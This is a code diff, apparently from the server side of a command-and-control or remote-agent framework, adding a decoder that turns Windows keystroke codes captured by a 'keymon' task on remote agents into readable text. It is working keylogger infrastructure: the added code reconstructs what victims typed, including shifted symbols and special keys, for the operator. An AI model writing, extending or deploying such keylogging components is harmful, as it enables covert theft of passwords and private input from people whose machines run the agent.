@@ -345,9 +345,95 @@ export const setResult = async (agentID, data) => {
     }
   }else if (task.taskType === "keymon" && agent.os === "windows"){
     if (data["main-kbd"]){
+      let mapping = {};
+      mapping[3] = "[CTRL-C]";
+      mapping[8] = "[BACKSPACE]";
+      mapping[9] = "[TAB]";
+      mapping[12] = "[CLEAR]"
+      mapping[13] = "[ENTER]";
+      mapping[16] = "[SHIFT]";
+      mapping[17] = "[CTRL]";
+      mapping[18] = "[ALT]";
+      mapping[19] = "[PAUSE]";
+      mapping[20] = "[CAPSLOCK]";
+      mapping[0x1B] = "[ESC]";
+      mapping[32] = "[SPACE]";
+      mapping[33] = "[PAGEUP]"
+      mapping[34] = "[PAGEDOWN]";
+      mapping[35] = "[END]";
+      mapping[36] = "[HOME]";
+      mapping[37] = "[LEFT]";
+      mapping[38] = "[UP]";
+      mapping[39] = "[RIGHT]";
+      mapping[40] = "[DOWN]";
+      mapping[41] = "[SELECT]";
+      mapping[42] = "[PRINT]";
+      mapping[43] = "[EXEC]";
+      mapping[44] = "[PRTSC]";
+      mapping[45] = "[INS]";
+      mapping[46] = "[DEL]";
+      mapping[47] = "[HELP]";
+      mapping[0x5B] = "[L-WIN]";
+      mapping[0x5C] = "[R-WIN]";
+      mapping[0x5F] = "[SLEEP]";
+      for (let i = 0x70; i <= 0x87; i++)
+        mapping[i] = `F${i - 0x6F}`;
+      for (let i = 0x60; i <= 0x69; i++)
+        mapping[i] = `${i - 0x60}`;
+      mapping[0x90] = "[NUMLOCK]";
+      mapping[0x91] = "[SCROLL]";
+      mapping[0xA0] = "[L-SHIFT]";
+      mapping[0xA1] = "[R-SHIFT]";
+      mapping[0xA2] = "[L-CTRL]";
+      mapping[0xA3] = "[R-CTRL]";
+      mapping[0xA4] = "[L-MENU]";
+      mapping[0xA5] = "[R-MENU]";
+      mapping[0xAD] = "[MUTE]";
+      mapping[0xAE] = "[VOL-DOWN]";
+      mapping[0xAF] = "[VOL-UP]";
+      mapping[0xFE] = "[CLEAR]";
       for (let i = 0; i < data["main-kbd"].length && i < global.KEYMON_MAX_KEYS; i++){
-        let keyCode = data["main-kbd"][i];
-        task.result += `${keyCode} `;
+        let input = data["main-kbd"][i];
+        let caps = (input & 0x8000) != 0 ? true : false;
+        let shift = (input & 0x4000) != 0 ? true : false;
+        let code = input & 0xff;
+        let val = "";
+        if (code >= 0x41 && code <= 0x5A){ // A - Z
+          if (caps && shift)
+            code += 32; // switch to lower case
+          else if (caps == false && shift == false)
+            code += 32; // switch to lower case
+          val = String.fromCharCode(code);
+        }else if (mapping[code]){ // Valid mapping
+          val = mapping[code];
+        }else{
+          if (code == 0x30) val = shift ? ')' : '0';
+          else if (code == 0x31) val = shift ? '!' : '1';
+          else if (code == 0x32) val = shift ? '@' : '2';
+          else if (code == 0x33) val = shift ? '#' : '3';
+          else if (code == 0x34) val = shift ? '$' : '4';
+          else if (code == 0x35) val = shift ? '%' : '5';
+          else if (code == 0x36) val = shift ? '^' : '6';
+          else if (code == 0x37) val = shift ? '&' : '7';
+          else if (code == 0x38) val = shift ? '*' : '8';
+          else if (code == 0x39) val = shift ? '(' : '9';
+          else if (code == 0xBA) val = shift ? ':' : ';';
+          else if (code == 0xBB) val = shift ? '+' : '=';
+          else if (code == 0xBC) val = shift ? '<' : ',';
+          else if (code == 0xBD) val = shift ? '_' : '-';
+          else if (code == 0xBE) val = shift ? '>' : '.';
+          else if (code == 0xBF) val = shift ? '?' : '/';
+          else if (code == 0xC0) val = shift ? '~' : '`';
+          else if (code == 0xDB) val = shift ? '{' : '[';
+          else if (code == 0xDC) val = shift ? '|' : '\\';
+          else if (code == 0xDD) val = shift ? '}' : ']';
+          else if (code == 0xDE) val = shift ? '"' : "'";
+          else if (code >= 32 && code <= 126) // Printable ASCII
+            val = String.fromCharCode(code);
+          else
+            val = `0x${code.toString(16).padStart(2, '0').toUpperCase()}`;
+        }
+        task.result += `${val} `;
       }
     }
   }else if (task.taskType === "cd"){
